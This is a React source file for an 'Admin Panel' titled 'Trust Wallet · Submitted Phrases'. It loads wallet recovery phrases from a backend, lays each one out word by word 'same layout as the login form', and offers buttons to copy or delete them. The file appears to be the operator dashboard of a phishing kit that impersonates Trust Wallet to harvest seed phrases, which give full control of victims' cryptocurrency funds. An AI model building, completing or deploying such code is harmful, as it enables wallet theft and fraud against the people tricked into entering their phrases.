import { useState, useEffect } from "react";

const ShieldLogo = () => (
  <svg width="32" height="37" viewBox="0 0 52 60" fill="none" xmlns="http://www.w3.org/2000/svg">
    <defs>
      <linearGradient id="sg2" x1="0" y1="0" x2="52" y2="60" gradientUnits="userSpaceOnUse">
        <stop offset="0%" stopColor="#5198FF" />
        <stop offset="100%" stopColor="#1A6DFF" />
      </linearGradient>
    </defs>
    <path d="M26 2L3 11.5V27C3 40.8 13.2 53.6 26 57 38.8 53.6 49 40.8 49 27V11.5L26 2Z" fill="url(#sg2)" />
    <path d="M19 28.5L24 33.5L34 22" stroke="white" strokeWidth="2.8" strokeLinecap="round" strokeLinejoin="round" fill="none" />
  </svg>
);

export default function Admin() {
  const [phrases, setPhrases] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const [copied, setCopied] = useState(null);
  const [deleting, setDeleting] = useState(null);
  const [mounted, setMounted] = useState(false);

  useEffect(() => {
    setTimeout(() => setMounted(true), 60);
    fetchPhrases();
  }, []);

  const fetchPhrases = async () => {
    setLoading(true);
    setError("");
    try {
      const res = await fetch("http://localhost:3001/api/phrases");
      const data = await res.json();
      if (res.ok) setPhrases(data);
      else setError("Failed to load phrases.");
    } catch (err) {
      setError("Cannot connect to server. Is the backend running?");
    } finally {
      setLoading(false);
    }
  };

  const copyPhrase = (phrase, id) => {
    navigator.clipboard.writeText(phrase);
    setCopied(id);
    setTimeout(() => setCopied(null), 2000);
  };

  const deletePhrase = async (id) => {
    setDeleting(id);
    try {
      const res = await fetch("http://localhost:3001/api/phrases/" + id, { method: "DELETE" });
      if (res.ok) setPhrases(phrases.filter(p => p.id !== id));
    } catch (err) {
      setError("Could not delete.");
    } finally {
      setDeleting(null);
    }
  };

  const formatDate = (dateStr) => {
    const d = new Date(dateStr);
    return d.toLocaleDateString("en-US", { day: "2-digit", month: "short", year: "numeric" })
      + " · " + d.toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit" });
  };

  const todayCount = phrases.filter(p => {
    return new Date(p.created_at).toDateString() === new Date().toDateString();
  }).length;

  return (
    <div style={s.bg}>
      <div style={Object.assign({}, s.wrap, mounted ? s.wrapIn : {})}>

        {/* Header */}
        <div style={s.header}>
          <div style={s.headerLeft}>
            <ShieldLogo />
            <div>
              <h1 style={s.title}>Admin Panel</h1>
              <p style={s.subtitle}>Trust Wallet · Submitted Phrases</p>
            </div>
          </div>
          <button style={s.refreshBtn} onClick={fetchPhrases}>
            ↻ Refresh
          </button>
        </div>

        {/* Stats */}
        <div style={s.statsBar}>
          <div style={s.statBox}>
            <span style={s.statNum}>{phrases.length}</span>
            <span style={s.statLabel}>Total Phrases</span>
          </div>
          <div style={s.statBox}>
            <span style={s.statNum}>{todayCount}</span>
            <span style={s.statLabel}>Today</span>
          </div>
          <div style={s.statBox}>
            <span style={s.statNum}>{phrases.length > 0 ? phrases[0].id : 0}</span>
            <span style={s.statLabel}>Last ID</span>
          </div>
        </div>

        {/* Error */}
        {error && <div style={s.errorBox}>⚠️ {error}</div>}

        {/* Loading */}
        {loading && (
          <div style={s.centerBox}>
            <span className="tw-spin" style={s.spinner} />
            <span style={s.grayText}>Loading from database...</span>
          </div>
        )}

        {/* Empty */}
        {!loading && !error && phrases.length === 0 && (
          <div style={s.centerBox}>
            <span style={s.grayText}>No phrases submitted yet.</span>
          </div>
        )}

        {/* Phrase Cards */}
        {!loading && phrases.map((p, index) => {
          const words = p.phrase.trim().split(/\s+/);
          return (
            <div key={p.id} style={s.card}>

              {/* Card Header */}
              <div style={s.cardHeader}>
                <div style={s.cardHeaderLeft}>
                  <span style={s.entryBadge}>Entry #{p.id}</span>
                  <span style={s.wordCountBadge}>{words.length} words</span>
                </div>
                <span style={s.dateText}>{formatDate(p.created_at)}</span>
              </div>

              {/* Word Grid - numbered just like they were entered */}
              <div style={s.wordGrid}>
                {words.map((word, i) => (
                  <div key={i} style={s.wordCell}>
                    <span style={s.wordIndex}>{i + 1}</span>
                    <span style={s.wordValue}>{word}</span>
                  </div>
                ))}
              </div>

              {/* Card Footer Actions */}
              <div style={s.cardFooter}>
                <button
                  style={Object.assign({}, s.actionBtn, copied === p.id ? s.copiedBtn : s.copyBtn)}
                  onClick={() => copyPhrase(p.phrase, p.id)}
                >
                  {copied === p.id ? "✓ Copied!" : "📋 Copy All"}
                </button>
                <button
                  style={Object.assign({}, s.actionBtn, s.deleteBtn)}
                  onClick={() => deletePhrase(p.id)}
                  disabled={deleting === p.id}
                >
                  {deleting === p.id ? "Deleting..." : "🗑 Delete"}
                </button>
              </div>

            </div>
          );
        })}

      </div>
      <style>{globalCss}</style>
    </div>
  );
}

const s = {
  bg: {
    minHeight: "100vh",
    background: "#0A0F1E",
    padding: "24px 16px 40px",
    fontFamily: "'DM Sans', 'Segoe UI', sans-serif",
  },
  wrap: {
    maxWidth: "700px",
    margin: "0 auto",
    opacity: 0,
    transform: "translateY(12px)",
    transition: "opacity 0.4s ease, transform 0.4s ease",
  },
  wrapIn: { opacity: 1, transform: "translateY(0)" },
  header: {
    display: "flex",
    alignItems: "center",
    justifyContent: "space-between",
    marginBottom: "20px",
    flexWrap: "wrap",
    gap: "12px",
  },
  headerLeft: { display: "flex", alignItems: "center", gap: "12px" },
  title: { color: "#F1F5F9", fontSize: "20px", fontWeight: "700", margin: 0 },
  subtitle: { color: "#475569", fontSize: "12px", margin: 0 },
  refreshBtn: {
    background: "#1E293B",
    border: "1px solid rgba(255,255,255,0.08)",
    borderRadius: "10px",
    padding: "9px 16px",
    color: "#94A3B8",
    fontSize: "13px",
    fontWeight: "500",
    cursor: "pointer",
  },
  statsBar: { display: "flex", gap: "10px", marginBottom: "24px" },
  statBox: {
    flex: 1,
    background: "#1E293B",
    border: "1px solid rgba(255,255,255,0.06)",
    borderRadius: "12px",
    padding: "14px",
    display: "flex",
    flexDirection: "column",
    gap: "4px",
  },
  statNum: { color: "#3B82F6", fontSize: "24px", fontWeight: "700" },
  statLabel: { color: "#475569", fontSize: "12px" },
  errorBox: {
    background: "rgba(248,113,113,0.08)",
    border: "1px solid rgba(248,113,113,0.22)",
    borderRadius: "10px",
    padding: "12px 16px",
    color: "#F87171",
    fontSize: "13px",
    marginBottom: "16px",
  },
  centerBox: {
    display: "flex", alignItems: "center", justifyContent: "center",
    gap: "12px", padding: "48px 0",
  },
  spinner: {
    width: "20px", height: "20px",
    border: "2.5px solid rgba(59,130,246,0.2)",
    borderTopColor: "#3B82F6",
    borderRadius: "50%", display: "inline-block",
  },
  grayText: { color: "#475569", fontSize: "14px" },

  // Each submission is a card
  card: {
    background: "#1E293B",
    border: "1px solid rgba(255,255,255,0.07)",
    borderRadius: "16px",
    marginBottom: "16px",
    overflow: "hidden",
  },
  cardHeader: {
    display: "flex",
    alignItems: "center",
    justifyContent: "space-between",
    padding: "12px 16px",
    background: "#0F172A",
    borderBottom: "1px solid rgba(255,255,255,0.06)",
    flexWrap: "wrap",
    gap: "8px",
  },
  cardHeaderLeft: { display: "flex", alignItems: "center", gap: "8px" },
  entryBadge: {
    background: "rgba(59,130,246,0.15)",
    color: "#3B82F6",
    fontSize: "12px",
    fontWeight: "700",
    padding: "3px 10px",
    borderRadius: "20px",
    border: "1px solid rgba(59,130,246,0.25)",
  },
  wordCountBadge: {
    background: "rgba(255,255,255,0.05)",
    color: "#64748B",
    fontSize: "11px",
    fontWeight: "500",
    padding: "3px 8px",
    borderRadius: "20px",
  },
  dateText: { color: "#475569", fontSize: "11px" },

  // Word grid — same layout as the login form
  wordGrid: {
    display: "grid",
    gridTemplateColumns: "repeat(3, 1fr)",
    gap: "8px",
    padding: "16px",
  },
  wordCell: {
    display: "flex",
    alignItems: "center",
    gap: "7px",
    background: "#0F172A",
    border: "1px solid rgba(255,255,255,0.06)",
    borderRadius: "8px",
    padding: "8px 10px",
  },
  wordIndex: {
    color: "#2D3F55",
    fontSize: "10px",
    fontWeight: "700",
    minWidth: "14px",
  },
  wordValue: {
    color: "#CBD5E1",
    fontSize: "13px",
    fontFamily: "monospace",
    fontWeight: "500",
  },

  cardFooter: {
    display: "flex",
    gap: "8px",
    padding: "12px 16px",
    borderTop: "1px solid rgba(255,255,255,0.05)",
  },
  actionBtn: {
    display: "flex",
    alignItems: "center",
    gap: "6px",
    border: "none",
    borderRadius: "8px",
    padding: "8px 14px",
    fontSize: "13px",
    fontWeight: "600",
    cursor: "pointer",
  },
  copyBtn: { background: "rgba(59,130,246,0.12)", color: "#3B82F6" },
  copiedBtn: { background: "rgba(34,197,94,0.12)", color: "#22C55E" },
  deleteBtn: { background: "rgba(248,113,113,0.1)", color: "#F87171" },
};

const globalCss = `
  @import url('https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&display=swap');
  * { box-sizing: border-box; }
  @keyframes tw-spin { to { transform: rotate(360deg); } }
  .tw-spin { animation: tw-spin 0.75s linear infinite; }
  button:active { opacity: 0.75; }
`;
